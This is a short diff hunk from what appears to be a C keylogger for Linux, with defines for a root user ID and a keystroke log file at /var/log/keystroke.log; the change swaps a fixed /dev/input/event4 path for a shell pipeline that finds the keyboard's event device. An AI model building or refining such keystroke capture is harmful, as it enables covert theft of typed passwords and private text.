@@ -6,7 +6,7 @@
 #define CAPSLOCK 58
 #define ROOTID 0
 #define LOGFILE "/var/log/keystroke.log"
-#define DEVICEFILE "/dev/input/event4"
+#define COMMAND "grep -E 'Handlers|EV=' /proc/bus/input/devices |  grep -B1 'EV=120013' |  grep -Eo 'event[0-9]+' | tr -d '\n'"
 
 // declarations
 typedef struct input_event input_event;
